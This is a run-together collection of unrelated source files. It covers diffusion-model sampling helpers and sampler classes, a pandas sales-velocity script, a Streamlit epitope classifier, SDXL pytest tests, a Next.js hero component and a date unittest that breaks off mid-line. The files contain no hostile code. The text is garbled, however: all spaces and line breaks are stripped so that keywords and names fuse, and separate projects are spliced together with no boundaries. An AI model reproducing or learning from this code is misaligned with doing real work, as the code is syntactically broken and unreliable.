strength)ifstage2strengthisnotNone:sampler.discretization=Txt2NoisyDiscretizationWrapper(sampler.discretization,strength=stage2strength,original_steps=steps)returnsampler,num_rows,num_colsdefget_discretization(discretization,options,key=1):ifdiscretization=="LegacyDDPMDiscretization":discretization_config={"target":"sgm.modules.diffusionmodules.discretizer.LegacyDDPMDiscretization",}elifdiscretization=="EDMDiscretization":sigma_min=st.sidebar.number_input(f"sigma_min#{key}",value=options.get("sigma_min",0.03))#0.0292sigma_max=st.sidebar.number_input(f"sigma_max#{key}",value=options.get("sigma_max",14.61))#14.6146rho=st.sidebar.number_input(f"rho#{key}",value=options.get("rho",3.0))discretization_config={"target":"sgm.modules.diffusionmodules.discretizer.EDMDiscretization","params":{"sigma_min":sigma_min,"sigma_max":sigma_max,"rho":rho,},}returndiscretization_configdefget_sampler(sampler_name,steps,discretization_config,guider_config,key=1):ifsampler_name=="EulerEDMSampler"orsampler_name=="HeunEDMSampler":s_churn=st.sidebar.number_input(f"s_churn#{key}",value=0.0,min_value=0.0)s_tmin=st.sidebar.number_input(f"s_tmin#{key}",value=0.0,min_value=0.0)s_tmax=st.sidebar.number_input(f"s_tmax#{key}",value=999.0,min_value=0.0)s_noise=st.sidebar.number_input(f"s_noise#{key}",value=1.0,min_value=0.0)ifsampler_name=="EulerEDMSampler":sampler=EulerEDMSampler(num_steps=steps,discretization_config=discretization_config,guider_config=guider_config,s_churn=s_churn,s_tmin=s_tmin,s_tmax=s_tmax,s_noise=s_noise,verbose=True,)elifsampler_name=="HeunEDMSampler":sampler=HeunEDMSampler(num_steps=steps,discretization_config=discretization_config,guider_config=guider_config,s_churn=s_churn,s_tmin=s_tmin,s_tmax=s_tmax,s_noise=s_noise,verbose=True,)elif(sampler_name=="EulerAncestralSampler"orsampler_name=="DPMPP2SAncestralSampler"):s_noise=st.sidebar.number_input("s_noise",value=1.0,min_value=0.0)eta=st.sidebar.number_input("eta",value=1.0,min_value=0.0)ifsampler_name=="EulerAncestralSampler":sampler=EulerAncestralSampler(num_steps=steps,discretization_config=discretization_config,guider_config=guider_config,eta=eta,s_noise=s_noise,verbose=True,)elifsampler_name=="DPMPP2SAncestralSampler":sampler=DPMPP2SAncestralSampler(num_steps=steps,discretization_config=discretization_config,guider_config=guider_config,eta=eta,s_noise=s_noise,verbose=True,)elifsampler_name=="DPMPP2MSampler":sampler=DPMPP2MSampler(num_steps=steps,discretization_config=discretization_config,guider_config=guider_config,verbose=True,)elifsampler_name=="LinearMultistepSampler":order=st.sidebar.number_input("order",value=4,min_value=1)sampler=LinearMultistepSampler(num_steps=steps,discretization_config=discretization_config,guider_config=guider_config,order=order,verbose=True,)else:raiseValueError(f"unknownsampler{sampler_name}!")returnsamplerdefget_interactive_image()->Image.Image:image=st.file_uploader("Input",type=["jpg","JPEG","png"])ifimageisnotNone:image=Image.open(image)ifnotimage.mode=="RGB":image=image.convert("RGB")returnimagedefload_img(display:bool=True,size:Union[None,int,Tuple[int,int]]=None,center_crop:bool=False,):image=get_interactive_image()ifimageisNone:returnNoneifdisplay:st.image(image)w,h=image.sizeprint(f"loadedinputimageofsize({w},{h})")transform=[]ifsizeisnotNone:transform.append(transforms.Resize(size))ifcenter_crop:transform.append(transforms.CenterCrop(size))transform.append(transforms.ToTensor())transform.append(transforms.Lambda(lambdax:2.0*x-1.0))transform=transforms.Compose(transform)img=transform(image)[None,...]st.text(f"inputmin/max/mean:{img.min():.3f}/{img.max():.3f}/{img.mean():.3f}")returnimgdefget_init_img(batch_size=1,key=None):init_image=load_img(key=key).cuda()init_image=repeat(init_image,"1...->b...",b=batch_size)returninit_imagedefdo_sample(model,sampler,value_dict,num_samples,H,W,C,F,force_uc_zero_embeddings:Optional[List]=None,force_cond_zero_embeddings:Optional[List]=None,batch2model_input:List=None,return_latents=False,filter=None,T=None,additional_batch_uc_fields=None,decoding_t=None,):force_uc_zero_embeddings=default(force_uc_zero_embeddings,[])batch2model_input=default(batch2model_input,[])additional_batch_uc_fields=default(additional_batch_uc_fields,[])st.text("Sampling")outputs=st.empty()precision_scope=autocastwithtorch.no_grad():withprecision_scope("cuda"):withmodel.ema_scope():ifTisnotNone:num_samples=[num_samples,T]else:num_samples=[num_samples]load_model(model.conditioner)batch,batch_uc=get_batch(get_unique_embedder_keys_from_conditioner(model.conditioner),value_dict,num_samples,T=T,additional_batch_uc_fields=additional_batch_uc_fields,)c,uc=model.conditioner.get_unconditional_conditioning(batch,batch_uc=batch_uc,force_uc_zero_embeddings=force_uc_zero_embeddings,force_cond_zero_embeddings=force_cond_zero_embeddings,)unload_model(model.conditioner)forkinc:ifnotk=="crossattn":c[k],uc[k]=map(lambday:y[k][:math.prod(num_samples)].to("cuda"),(c,uc))ifkin["crossattn","concat"]andTisnotNone:uc[k]=repeat(uc[k],"b...->bt...",t=T)uc[k]=rearrange(uc[k],"bt...->(bt)...",t=T)c[k]=repeat(c[k],"b...->bt...",t=T)c[k]=rearrange(c[k],"bt...->(bt)...",t=T)additional_model_inputs={}forkinbatch2model_input:ifk=="image_only_indicator":assertTisnotNoneifisinstance(sampler.guider,(VanillaCFG,LinearPredictionGuider,TrianglePredictionGuider,),):additional_model_inputs[k]=torch.zeros(num_samples[0]*2,num_samples[1]).to("cuda")else:additional_model_inputs[k]=torch.zeros(num_samples).to("cuda")else:additional_model_inputs[k]=batch[k]shape=(math.prod(num_samples),C,H//F,W//F)randn=torch.randn(shape).to("cuda")defdenoiser(input,sigma,c):returnmodel.denoiser(model.model,input,sigma,c,**additional_model_inputs)load_model(model.denoiser)load_model(model.model)samples_z=sampler(denoiser,randn,cond=c,uc=uc)unload_model(model.model)unload_model(model.denoiser)load_model(model.first_stage_model)model.en_and_decode_n_samples_a_time=(decoding_t#Decodenframesatatime)samples_x=model.decode_first_stage(samples_z)samples=torch.clamp((samples_x+1.0)/2.0,min=0.0,max=1.0)unload_model(model.first_stage_model)iffilterisnotNone:samples=filter(samples)ifTisNone:grid=torch.stack([samples])grid=rearrange(grid,"nbchw->(nh)(bw)c")outputs.image(grid.cpu().numpy())else:as_vids=rearrange(samples,"(bt)chw->btchw",t=T)fori,vidinenumerate(as_vids):grid=rearrange(make_grid(vid,nrow=4),"chw->hwc")st.image(grid.cpu().numpy(),f"Sample#{i}asimage",)ifreturn_latents:returnsamples,samples_zreturnsamplesdefget_batch(keys,value_dict:dict,N:Union[List,ListConfig],device:str="cuda",T:int=None,additional_batch_uc_fields:List[str]=[],):#Hardcodeddemosetups;mightundergosomechangesinthefuturebatch={}batch_uc={}forkeyinkeys:ifkey=="txt":batch["txt"]=[value_dict["prompt"]]*math.prod(N)batch_uc["txt"]=[value_dict["negative_prompt"]]*math.prod(N)elifkey=="original_size_as_tuple":batch["original_size_as_tuple"]=(torch.tensor([value_dict["orig_height"],value_dict["orig_width"]]).to(device).repeat(math.prod(N),1))elifkey=="crop_coords_top_left":batch["crop_coords_top_left"]=(torch.tensor([value_dict["crop_coords_top"],value_dict["crop_coords_left"]]).to(device).repeat(math.prod(N),1))elifkey=="aesthetic_score":batch["aesthetic_score"]=(torch.tensor([value_dict["aesthetic_score"]]).to(device).repeat(math.prod(N),1))batch_uc["aesthetic_score"]=(torch.tensor([value_dict["negative_aesthetic_score"]]).to(device).repeat(math.prod(N),1))elifkey=="target_size_as_tuple":batch["target_size_as_tuple"]=(torch.tensor([value_dict["target_height"],value_dict["target_width"]]).to(device).repeat(math.prod(N),1))elifkey=="fps":batch[key]=(torch.tensor([value_dict["fps"]]).to(device).repeat(math.prod(N)))elifkey=="fps_id":batch[key]=(torch.tensor([value_dict["fps_id"]]).to(device).repeat(math.prod(N)))elifkey=="motion_bucket_id":batch[key]=(torch.tensor([value_dict["motion_bucket_id"]]).to(device).repeat(math.prod(N)))elifkey=="pool_image":batch[key]=repeat(value_dict[key],"1...->b...",b=math.prod(N)).to(device,dtype=torch.half)elifkey=="cond_aug":batch[key]=repeat(torch.tensor([value_dict["cond_aug"]]).to("cuda"),"1->b",b=math.prod(N),)elifkey=="cond_frames":batch[key]=repeat(value_dict["cond_frames"],"1...->b...",b=N[0])elifkey=="cond_frames_without_noise":batch[key]=repeat(value_dict["cond_frames_without_noise"],"1...->b...",b=N[0])elifkey=="polars_rad":batch[key]=torch.tensor(value_dict["polars_rad"]).to(device).repeat(N[0])elifkey=="azimuths_rad":batch[key]=(torch.tensor(value_dict["azimuths_rad"]).to(device).repeat(N[0]))else:batch[key]=value_dict[key]ifTisnotNone:batch["num_video_frames"]=Tforkeyinbatch.keys():ifkeynotinbatch_ucandisinstance(batch[key],torch.Tensor):batch_uc[key]=torch.clone(batch[key])elifkeyinadditional_batch_uc_fieldsandkeynotinbatch_uc:batch_uc[key]=copy.copy(batch[key])returnbatch,batch_uc@torch.no_grad()defdo_img2img(img,model,sampler,value_dict,num_samples,force_uc_zero_embeddings:Optional[List]=None,force_cond_zero_embeddings:Optional[List]=None,additional_kwargs={},offset_noise_level:int=0.0,return_latents=False,skip_encode=False,filter=None,add_noise=True,):st.text("Sampling")outputs=st.empty()precision_scope=autocastwithtorch.no_grad():withprecision_scope("cuda"):withmodel.ema_scope():load_model(model.conditioner)batch,batch_uc=get_batch(get_unique_embedder_keys_from_conditioner(model.conditioner),value_dict,[num_samples],)c,uc=model.conditioner.get_unconditional_conditioning(batch,batch_uc=batch_uc,force_uc_zero_embeddings=force_uc_zero_embeddings,force_cond_zero_embeddings=force_cond_zero_embeddings,)unload_model(model.conditioner)forkinc:c[k],uc[k]=map(lambday:y[k][:num_samples].to("cuda"),(c,uc))forkinadditional_kwargs:c[k]=uc[k]=additional_kwargs[k]ifskip_encode:z=imgelse:load_model(model.first_stage_model)z=model.encode_first_stage(img)unload_model(model.first_stage_model)noise=torch.randn_like(z)sigmas=sampler.discretization(sampler.num_steps).cuda()sigma=sigmas[0]st.info(f"allsigmas:{sigmas}")st.info(f"noisingsigma:{sigma}")ifoffset_noise_level>0.0:noise=noise+offset_noise_level*append_dims(torch.randn(z.shape[0],device=z.device),z.ndim)ifadd_noise:noised_z=z+noise*append_dims(sigma,z.ndim).cuda()noised_z=noised_z/torch.sqrt(1.0+sigmas[0]**2.0)#Note:hardcodedtoDDPM-likescaling.needtogeneralizelater.else:noised_z=z/torch.sqrt(1.0+sigmas[0]**2.0)defdenoiser(x,sigma,c):returnmodel.denoiser(model.model,x,sigma,c)load_model(model.denoiser)load_model(model.model)samples_z=sampler(denoiser,noised_z,cond=c,uc=uc)unload_model(model.model)unload_model(model.denoiser)load_model(model.first_stage_model)samples_x=model.decode_first_stage(samples_z)unload_model(model.first_stage_model)samples=torch.clamp((samples_x+1.0)/2.0,min=0.0,max=1.0)iffilterisnotNone:samples=filter(samples)grid=rearrange(grid,"nbchw->(nh)(bw)c")outputs.image(grid.cpu().numpy())ifreturn_latents:returnsamples,samples_zreturnsamplesdefget_resizing_factor(desired_shape:Tuple[int,int],current_shape:Tuple[int,int])->float:r_bound=desired_shape[1]/desired_shape[0]aspect_r=current_shape[1]/current_shape[0]ifr_bound>=1.0:ifaspect_r>=r_bound:factor=min(desired_shape)/min(current_shape)else:ifaspect_r<1.0:factor=max(desired_shape)/min(current_shape)else:factor=max(desired_shape)/max(current_shape)else:ifaspect_r<=r_bound:factor=min(desired_shape)/min(current_shape)else:ifaspect_r>1:factor=max(desired_shape)/min(current_shape)else:factor=max(desired_shape)/max(current_shape)returnfactordefget_interactive_image(key=None)->Image.Image:image=st.file_uploader("Input",type=["jpg","JPEG","png"],key=key)ifimageisnotNone:image=Image.open(image)ifnotimage.mode=="RGB":image=image.convert("RGB")returnimagedefload_img_for_prediction(W:int,H:int,display=True,key=None,device="cuda")->torch.Tensor:image=get_interactive_image(key=key)ifimageisNone:returnNoneifdisplay:st.image(image)w,h=image.sizeimage=np.array(image).astype(np.float32)/255ifimage.shape[-1]==4:rgb,alpha=image[:,:,:3],image[:,:,3:]image=rgb*alpha+(1-alpha)image=image.transpose(2,0,1)image=torch.from_numpy(image).to(dtype=torch.float32)image=image.unsqueeze(0)rfs=get_resizing_factor((H,W),(h,w))resize_size=[int(np.ceil(rfs*s))forsin(h,w)]top=(resize_size[0]-H)//2left=(resize_size[1]-W)//2image=torch.nn.functional.interpolate(image,resize_size,mode="area",antialias=False)image=TT.functional.crop(image,top=top,left=left,height=H,width=W)ifdisplay:numpy_img=np.transpose(image[0].numpy(),(1,2,0))pil_image=Image.fromarray((numpy_img*255).astype(np.uint8))st.image(pil_image)returnimage.to(device)*2.0-1.0defsave_video_as_grid_and_mp4(video_batch:torch.Tensor,save_path:str,T:int,fps:int=5):os.makedirs(save_path,exist_ok=True)base_count=len(glob(os.path.join(save_path,"*.mp4")))video_batch=rearrange(video_batch,"(bt)chw->btchw",t=T)video_batch=embed_watermark(video_batch)forvidinvideo_batch:save_image(vid,fp=os.path.join(save_path,f"{base_count:06d}.png"),nrow=4)video_path=os.path.join(save_path,f"{base_count:06d}.mp4")vid=((rearrange(vid,"tchw->thwc")*255).cpu().numpy().astype(np.uint8))imageio.mimwrite(video_path,vid,fps=fps)video_path_h264=video_path[:-4]+"_h264.mp4"os.system(f"ffmpeg-i'{video_path}'-c:vlibx264'{video_path_h264}'")withopen(video_path_h264,"rb")asf:video_bytes=f.read()os.remove(video_path_h264)st.video(video_bytes)base_count+=1importpandasaspd#readdatafiledf=pd.read_excel('data.xlsm')#filtercolumnsandrenamedf=df[['Date','Name','Item','SOQty']].rename(columns={'Name':'Distributor','Item':'Product','SOQty':'SOQuantity'})#convertdatecolumntodateobjectdf['Date']=pd.to_datetime(df['Date'])#uniquestoresandproductsstores=df['Distributor'].unique()products=sorted(df['Product'].unique())#groupbydistributor-productpairsandcalculatethetotalunitssoldgroupby=pd.DataFrame(df.groupby(['Distributor','Product'])['SOQuantity'].sum()*10#multiplyby10togettotalunitsfromSOquantity).rename(columns={'SOQuantity':'TotalUnits'})#renamethecolumn#calculatetotalweekssincefirstpurchasegroupby['Weeks']=df.groupby(['Distributor','Product'])['Date'].apply(lambdax:(pd.Timestamp.now()-x.min()).days/7)#calculatethevelocitygroupby['Velocity']=groupby['TotalUnits']/groupby['Weeks']#outputtoExcelfilegroupby.to_excel('output.xlsx',index=True)"""Partiallyportedfromhttps://github.com/crowsonkb/k-diffusion/blob/master/k_diffusion/sampling.py"""fromtypingimportDict,UnionimporttorchfromomegaconfimportListConfig,OmegaConffromtqdmimporttqdmfrom...modules.diffusionmodules.sampling_utilsimport(get_ancestral_step,linear_multistep_coeff,to_d,to_neg_log_sigma,to_sigma)from...utilimportappend_dims,default,instantiate_from_configDEFAULT_GUIDER={"target":"sgm.modules.diffusionmodules.guiders.IdentityGuider"}classBaseDiffusionSampler:def__init__(self,discretization_config:Union[Dict,ListConfig,OmegaConf],num_steps:Union[int,None]=None,guider_config:Union[Dict,ListConfig,OmegaConf,None]=None,verbose:bool=False,device:str="cuda",):self.num_steps=num_stepsself.discretization=instantiate_from_config(discretization_config)self.guider=instantiate_from_config(default(guider_config,DEFAULT_GUIDER,))self.verbose=verboseself.device=devicedefprepare_sampling_loop(self,x,cond,uc=None,num_steps=None):sigmas=self.discretization(self.num_stepsifnum_stepsisNoneelsenum_steps,device=self.device)uc=default(uc,cond)x*=torch.sqrt(1.0+sigmas[0]**2.0)num_sigmas=len(sigmas)s_in=x.new_ones([x.shape[0]])returnx,s_in,sigmas,num_sigmas,cond,ucdefdenoise(self,x,denoiser,sigma,cond,uc):denoised=denoiser(*self.guider.prepare_inputs(x,sigma,cond,uc))denoised=self.guider(denoised,sigma)returndenoiseddefget_sigma_gen(self,num_sigmas):sigma_generator=range(num_sigmas-1)ifself.verbose:print("#"*30,"Samplingsetting","#"*30)print(f"Sampler:{self.__class__.__name__}")print(f"Discretization:{self.discretization.__class__.__name__}")print(f"Guider:{self.guider.__class__.__name__}")sigma_generator=tqdm(sigma_generator,total=num_sigmas,desc=f"Samplingwith{self.__class__.__name__}for{num_sigmas}steps",)returnsigma_generatorclassSingleStepDiffusionSampler(BaseDiffusionSampler):defsampler_step(self,sigma,next_sigma,denoiser,x,cond,uc,*args,**kwargs):raiseNotImplementedErrordefeuler_step(self,x,d,dt):returnx+dt*dclassEDMSampler(SingleStepDiffusionSampler):def__init__(self,s_churn=0.0,s_tmin=0.0,s_tmax=float("inf"),s_noise=1.0,*args,**kwargs):super().__init__(*args,**kwargs)self.s_churn=s_churnself.s_tmin=s_tminself.s_tmax=s_tmaxself.s_noise=s_noisedefsampler_step(self,sigma,next_sigma,denoiser,x,cond,uc=None,gamma=0.0):sigma_hat=sigma*(gamma+1.0)ifgamma>0:eps=torch.randn_like(x)*self.s_noisex=x+eps*append_dims(sigma_hat**2-sigma**2,x.ndim)**0.5denoised=self.denoise(x,denoiser,sigma_hat,cond,uc)d=to_d(x,sigma_hat,denoised)dt=append_dims(next_sigma-sigma_hat,x.ndim)euler_step=self.euler_step(x,d,dt)x=self.possible_correction_step(euler_step,x,d,dt,next_sigma,denoiser,cond,uc)returnxdef__call__(self,denoiser,x,cond,uc=None,num_steps=None):x,s_in,sigmas,num_sigmas,cond,uc=self.prepare_sampling_loop(x,cond,uc,num_steps)foriinself.get_sigma_gen(num_sigmas):gamma=(min(self.s_churn/(num_sigmas-1),2**0.5-1)ifself.s_tmin<=sigmas[i]<=self.s_tmaxelse0.0)x=self.sampler_step(s_in*sigmas[i],s_in*sigmas[i+1],denoiser,x,cond,uc,gamma,)returnxclassAncestralSampler(SingleStepDiffusionSampler):def__init__(self,eta=1.0,s_noise=1.0,*args,**kwargs):super().__init__(*args,**kwargs)self.eta=etaself.s_noise=s_noiseself.noise_sampler=lambdax:torch.randn_like(x)defancestral_euler_step(self,x,denoised,sigma,sigma_down):d=to_d(x,sigma,denoised)dt=append_dims(sigma_down-sigma,x.ndim)returnself.euler_step(x,d,dt)defancestral_step(self,x,sigma,next_sigma,sigma_up):x=torch.where(append_dims(next_sigma,x.ndim)>0.0,x+self.noise_sampler(x)*self.s_noise*append_dims(sigma_up,x.ndim),x,)returnxdef__call__(self,denoiser,x,cond,uc=None,num_steps=None):x,s_in,sigmas,num_sigmas,cond,uc=self.prepare_sampling_loop(x,cond,uc,num_steps)foriinself.get_sigma_gen(num_sigmas):x=self.sampler_step(s_in*sigmas[i],s_in*sigmas[i+1],denoiser,x,cond,uc,)returnxclassLinearMultistepSampler(BaseDiffusionSampler):def__init__(self,order=4,*args,**kwargs,):super().__init__(*args,**kwargs)self.order=orderdef__call__(self,denoiser,x,cond,uc=None,num_steps=None,**kwargs):x,s_in,sigmas,num_sigmas,cond,uc=self.prepare_sampling_loop(x,cond,uc,num_steps)ds=[]sigmas_cpu=sigmas.detach().cpu().numpy()foriinself.get_sigma_gen(num_sigmas):sigma=s_in*sigmas[i]denoised=denoiser(*self.guider.prepare_inputs(x,sigma,cond,uc),**kwargs)denoised=self.guider(denoised,sigma)d=to_d(x,sigma,denoised)ds.append(d)iflen(ds)>self.order:ds.pop(0)cur_order=min(i+1,self.order)coeffs=[linear_multistep_coeff(cur_order,sigmas_cpu,i,j)forjinrange(cur_order)]x=x+sum(coeff*dforcoeff,dinzip(coeffs,reversed(ds)))returnxclassEulerEDMSampler(EDMSampler):defpossible_correction_step(self,euler_step,x,d,dt,next_sigma,denoiser,cond,uc):returneuler_stepclassHeunEDMSampler(EDMSampler):defpossible_correction_step(self,euler_step,x,d,dt,next_sigma,denoiser,cond,uc):iftorch.sum(next_sigma)<1e-14:#Saveanetworkevaluationifallnoiselevelsare0returneuler_stepelse:denoised=self.denoise(euler_step,denoiser,next_sigma,cond,uc)d_new=to_d(euler_step,next_sigma,denoised)d_prime=(d+d_new)/2.0#applycorrectionifnoiselevelisnot0x=torch.where(append_dims(next_sigma,x.ndim)>0.0,x+d_prime*dt,euler_step)returnxclassEulerAncestralSampler(AncestralSampler):defsampler_step(self,sigma,next_sigma,denoiser,x,cond,uc):sigma_down,sigma_up=get_ancestral_step(sigma,next_sigma,eta=self.eta)denoised=self.denoise(x,denoiser,sigma,cond,uc)x=self.ancestral_euler_step(x,denoised,sigma,sigma_down)x=self.ancestral_step(x,sigma,next_sigma,sigma_up)returnxclassDPMPP2SAncestralSampler(AncestralSampler):defget_variables(self,sigma,sigma_down):t,t_next=[to_neg_log_sigma(s)forsin(sigma,sigma_down)]h=t_next-ts=t+0.5*hreturnh,s,t,t_nextdefget_mult(self,h,s,t,t_next):mult1=to_sigma(s)/to_sigma(t)mult2=(-0.5*h).expm1()mult3=to_sigma(t_next)/to_sigma(t)mult4=(-h).expm1()returnmult1,mult2,mult3,mult4defsampler_step(self,sigma,next_sigma,denoiser,x,cond,uc=None,**kwargs):sigma_down,sigma_up=get_ancestral_step(sigma,next_sigma,eta=self.eta)denoised=self.denoise(x,denoiser,sigma,cond,uc)x_euler=self.ancestral_euler_step(x,denoised,sigma,sigma_down)iftorch.sum(sigma_down)<1e-14:#Saveanetworkevaluationifallnoiselevelsare0x=x_eulerelse:h,s,t,t_next=self.get_variables(sigma,sigma_down)mult=[append_dims(mult,x.ndim)formultinself.get_mult(h,s,t,t_next)]x2=mult[0]*x-mult[1]*denoiseddenoised2=self.denoise(x2,denoiser,to_sigma(s),cond,uc)x_dpmpp2s=mult[2]*x-mult[3]*denoised2#applycorrectionifnoiselevelisnot0x=torch.where(append_dims(sigma_down,x.ndim)>0.0,x_dpmpp2s,x_euler)x=self.ancestral_step(x,sigma,next_sigma,sigma_up)returnxclassDPMPP2MSampler(BaseDiffusionSampler):defget_variables(self,sigma,next_sigma,previous_sigma=None):t,t_next=[to_neg_log_sigma(s)forsin(sigma,next_sigma)]h=t_next-tifprevious_sigmaisnotNone:h_last=t-to_neg_log_sigma(previous_sigma)r=h_last/hreturnh,r,t,t_nextelse:returnh,None,t,t_nextdefget_mult(self,h,r,t,t_next,previous_sigma):mult1=to_sigma(t_next)/to_sigma(t)mult2=(-h).expm1()ifprevious_sigmaisnotNone:mult3=1+1/(2*r)mult4=1/(2*r)returnmult1,mult2,mult3,mult4else:returnmult1,mult2defsampler_step(self,old_denoised,previous_sigma,sigma,next_sigma,denoiser,x,cond,uc=None,):denoised=self.denoise(x,denoiser,sigma,cond,uc)h,r,t,t_next=self.get_variables(sigma,next_sigma,previous_sigma)mult=[append_dims(mult,x.ndim)formultinself.get_mult(h,r,t,t_next,previous_sigma)]x_standard=mult[0]*x-mult[1]*denoisedifold_denoisedisNoneortorch.sum(next_sigma)<1e-14:#Saveanetworkevaluationifallnoiselevelsare0oronthefirststepreturnx_standard,denoisedelse:denoised_d=mult[2]*denoised-mult[3]*old_denoisedx_advanced=mult[0]*x-mult[1]*denoised_d#applycorrectionifnoiselevelisnot0andnotfirststepx=torch.where(append_dims(next_sigma,x.ndim)>0.0,x_advanced,x_standard)returnx,denoiseddef__call__(self,denoiser,x,cond,uc=None,num_steps=None,**kwargs):x,s_in,sigmas,num_sigmas,cond,uc=self.prepare_sampling_loop(x,cond,uc,num_steps)old_denoised=Noneforiinself.get_sigma_gen(num_sigmas):x,old_denoised=self.sampler_step(old_denoised,Noneifi==0elses_in*sigmas[i-1],s_in*sigmas[i],s_in*sigmas[i+1],denoiser,x,cond,uc=uc,)returnxfromenumimportEnumclassFinger(Enum):L_INDEX=0L_MIDDLE=1L_RING=2L_PINKY=3R_INDEX=4R_MIDDLE=5R_RING=6R_PINKY=7importstreamlitasstfromtransformersimportTFAutoModelForSequenceClassificationfromtransformersimportAutoTokenizerimportpandasaspd#titlest.title('RavensAI')#textinputwithlabelsequence=st.text_input('EnterAminoAcidSequence')model_type=st.radio("ChooseLinearEpitopeClassifier",('LinearT-Cells(MHCClassIRestriction)','LinearT-Cells(MHCClassIIRestriction)','LinearB-Cell'))#windowslengthslider#length=st.slider('WindowLength',1,50,10)threshold=st.slider('ProbabilityThreshold',0.0,1.0,0.5)model_checkpoint="facebook/esm2_t6_8M_UR50D"tokenizer=AutoTokenizer.from_pretrained(model_checkpoint)importtimewhileTrue:try:ifmodel_type=='LinearT-Cells(MHCClassIRestriction)':model=TFAutoModelForSequenceClassification.from_pretrained('classifier')elifmodel_type=='LinearT-Cells(MHCClassIIRestriction)':model=TFAutoModelForSequenceClassification.from_pretrained('classifier2')elifmodel_type=='LinearB-Cell':model=TFAutoModelForSequenceClassification.from_pretrained('bcell')breakexcept:time.sleep(1)#submitbuttonifst.button('Submit'):locations=[]peptide_name=sequencepeptide=tokenizer(peptide_name,return_tensors="tf")output=model(peptide)locations.append([peptide_name,output.logits.numpy()[0][0]])locations=pd.DataFrame(locations,columns=['Peptide','Probability'])#displaytablewithsequenceandprobabilityastheheadersdefcolor_survived(x:float):#xbetween0and1#redtogreenscalebasedonx#0->red#0.5->clear#1->green#redifx<threshold:r=179g=40b=2#greenelse:r=18g=150b=6returnf'background-color:rgb({r},{g},{b})'st.table(locations.style.applymap(color_survived,subset=['Probability']))importnumpyfromPILimportImageimportpytestfrompytestimportfixtureimporttorchfromtypingimportTuplefromsgm.inference.apiimport(model_specs,SamplingParams,SamplingPipeline,Sampler,ModelArchitecture,)importsgm.inference.helpersashelpers@pytest.mark.inferenceclassTestInference:@fixture(scope="class",params=model_specs.keys())defpipeline(self,request)->SamplingPipeline:pipeline=SamplingPipeline(request.param)yieldpipelinedelpipelinetorch.cuda.empty_cache()@fixture(scope="class",params=[[ModelArchitecture.SDXL_V1_BASE,ModelArchitecture.SDXL_V1_REFINER],[ModelArchitecture.SDXL_V0_9_BASE,ModelArchitecture.SDXL_V0_9_REFINER],],ids=["SDXL_V1","SDXL_V0_9"],)defsdxl_pipelines(self,request)->Tuple[SamplingPipeline,SamplingPipeline]:base_pipeline=SamplingPipeline(request.param[0])refiner_pipeline=SamplingPipeline(request.param[1])yieldbase_pipeline,refiner_pipelinedelbase_pipelinedelrefiner_pipelinetorch.cuda.empty_cache()defcreate_init_image(self,h,w):image_array=numpy.random.rand(h,w,3)*255image=Image.fromarray(image_array.astype("uint8")).convert("RGB")returnhelpers.get_input_image_tensor(image)@pytest.mark.parametrize("sampler_enum",Sampler)deftest_txt2img(self,pipeline:SamplingPipeline,sampler_enum):output=pipeline.text_to_image(params=SamplingParams(sampler=sampler_enum.value,steps=10),prompt="Aprofessionalphotographofanastronautridingapig",negative_prompt="",samples=1,)assertoutputisnotNone@pytest.mark.parametrize("sampler_enum",Sampler)deftest_img2img(self,pipeline:SamplingPipeline,sampler_enum):output=pipeline.image_to_image(params=SamplingParams(sampler=sampler_enum.value,steps=10),image=self.create_init_image(pipeline.specs.height,pipeline.specs.width),prompt="Aprofessionalphotographofanastronautridingapig",negative_prompt="",samples=1,)assertoutputisnotNone@pytest.mark.parametrize("sampler_enum",Sampler)@pytest.mark.parametrize("use_init_image",[True,False],ids=["img2img","txt2img"])deftest_sdxl_with_refiner(self,sdxl_pipelines:Tuple[SamplingPipeline,SamplingPipeline],sampler_enum,use_init_image,):base_pipeline,refiner_pipeline=sdxl_pipelinesifuse_init_image:output=base_pipeline.image_to_image(params=SamplingParams(sampler=sampler_enum.value,steps=10),image=self.create_init_image(base_pipeline.specs.height,base_pipeline.specs.width),prompt="Aprofessionalphotographofanastronautridingapig",negative_prompt="",samples=1,return_latents=True,)else:output=base_pipeline.text_to_image(params=SamplingParams(sampler=sampler_enum.value,steps=10),prompt="Aprofessionalphotographofanastronautridingapig",negative_prompt="",samples=1,return_latents=True,)assertisinstance(output,(tuple,list))samples,samples_z=outputassertsamplesisnotNoneassertsamples_zisnotNonerefiner_pipeline.refiner(params=SamplingParams(sampler=sampler_enum.value,steps=10),image=samples_z,prompt="Aprofessionalphotographofanastronautridingapig",negative_prompt="",samples=1,)importLinkfrom'next/link';importImagefrom'next/image';import{useState,useEffect}from'react';constHero=()=>{const[windowWidth,setWindowWidth]=useState(null);useEffect(()=>{setWindowWidth(window.innerWidth);consthandleResize=()=>{setWindowWidth(window.innerWidth);};window.addEventListener('resize',handleResize);//Cleanupfunctiontoremovetheeventlistenerreturn()=>{window.removeEventListener('resize',handleResize);};},[]);//Don'trenderthecomponentontheserverif(windowWidth===null){returnnull;}return(<divclassName='bg-slate-100'><divclassName='flexjustify-between'><divclassName='sm:w-fullmd:w-fulllg:w-1/2mx-10'><Imagesrc='/banner.png'width={5358}height={1}alt='logo'priority/><divclassName='flexjustify-centeritems-center'><Linkhref='/shop'className='rounded-mdbg-gradient-to-rfrom-sky-500to-sky-400hover:from-sky-400hover:to-sky-300px-3.5py-2.5text-smfont-semiboldtext-whiteshadow-smhover:bg-indigo-500focus-visible:outlinefocus-visible:outline-2focus-visible:outline-offset-2focus-visible:outline-indigo-600mb-5'>ExploreProducts</Link></div></div>{windowWidth>1024&&(<divclassName='w-1/2mx-10'><ImageclassName='crop'src='/stationery.jpg'width={5358}height={1}alt='logo'priority/></div>)}</div></div>);};exportdefaultHero;importunittestfromdatetimeimportdatefromcalculateimport*classTestCalculate(unittest.TestCase):deftest_even_odd(self):dates=[date(2023,8,29),date(2023,8,30),date(2023,9,5),date(2023,9,6),]outs=[0,1,0,1]foriinrange(len(dates)):self.assertEqual(even_odd(dates[i]),outs[i])deftest_get_day_progress_from_datetime(self):day=date(2023,8,29)times=[datetime(day.year,day.month,day.day,4,30),datetime(day.year,day.month,day.day,4,45),datetime(day.year,day.month,day.day,12,20),datetime(day.year,day.month,day.day,5,45),datetime(day.year,day.month,day.day,12,23),]outs=[0,0,1,1/(7+35/60),1]fortime,outinzip(times,outs):self.assertEqual(get_day_progress_from_datetime(time),out)deftest_get_period_progress_from_datetime(self):day=date(2023,8,29)times=[#startandendofperiodsdatetime(day.year,day.month,day.day,4,45),datetime(day.year,day.month,day.day,6,23),datetime(day.year,day.month,day.day,6,29),datetime(day.year,day.month,day.day,11,30),datetime(day.year,day.month,day.day,11,35),datetime(day.year,day.month,da